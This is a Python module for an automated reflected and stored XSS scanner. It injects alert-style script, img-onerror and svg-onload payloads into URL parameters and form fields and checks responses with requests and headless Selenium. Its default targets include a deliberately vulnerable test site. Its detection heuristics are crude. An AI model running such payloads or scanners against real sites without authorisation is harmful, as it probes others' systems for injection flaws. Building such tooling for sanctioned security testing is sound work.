import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
]

results = []


def inject_payloads(url, logger):
    logger.log(f"[*] Scanning URL: {url}")
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    if not qs:
        logger.log(f"[-] No parameters found in URL: {url}")
        return

    for param in qs:
        for payload in XSS_PAYLOADS:
            test_params = qs.copy()
            test_params[param] = [payload]
            encoded_query = urlencode(test_params, doseq=True)

            test_url = urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, encoded_query, parsed.fragment)
            )

            logger.log(f"[+] Testing payload on param '{param}': {payload}")

            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text:
                    logger.log(f"[!] Possible XSS found on param '{param}' with payload: {payload}")
                    if "&lt;" not in response.text:
                        logger.log("[!] Might be reflected unescaped.")

                    results.append({
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "type": "reflected",
                    })

                run_selenium_test(test_url, logger)

            except Exception as e:
                logger.log(f"[!] Request error: {e}")


def scan_post_forms(url, logger):
    logger.log(f"[*] Scanning forms on: {url}")
    try:
        resp = requests.get(url)
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            data = {}

            for i in inputs:
                name = i.get("name")
                if name:
                    data[name] = "<script>alert('XSS')</script>"

            if method == "post":
                full_url = action if action.startswith("http") else url + action
                logger.log(f"[POST] Submitting form to: {full_url}")
                response = requests.post(full_url, data=data)
                if "<script>alert('XSS')</script>" in response.text:
                    logger.log("[!] Reflected XSS in form POST response!")
                    results.append({
                        "url": full_url,
                        "param": "form",
                        "payload": "<script>alert('XSS')</script>",
                        "type": "post_form",
                    })

    except Exception as e:
        logger.log(f"[!] Error scanning forms: {e}")


def run_selenium_test(url, logger):
    logger.log(f"[Selenium] Opening browser for URL: {url}")
    options = Options()
    options.headless = True
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(url)
        time.sleep(2)

        if "alert" in driver.page_source or "<script>" in driver.page_source:
            logger.log("[!] Potential stored XSS detected with Selenium!")
            results.append({
                "url": url,
                "param": "n/a",
                "payload": "stored-payload",
                "type": "stored_xss",
            })

    except Exception as e:
        logger.log(f"[!] Selenium error: {e}")
    finally:
        driver.quit()


def run(logger, target_urls=None):
    if target_urls is None:
        target_urls = [
            "http://testphp.vulnweb.com/search.php?test=query",
            "http://example.com/page?name=value"
        ]

    logger.log("[*] Starting XSS scan...")
    for url in target_urls:
        inject_payloads(url, logger)
        scan_post_forms(url, logger)
    logger.log("[*] XSS scan completed.")

    try:
        from modules import report  # ✅ correct location
        report.save_report(results)
    except ImportError:
        logger.log("[!] Could not save report (missing report module)")
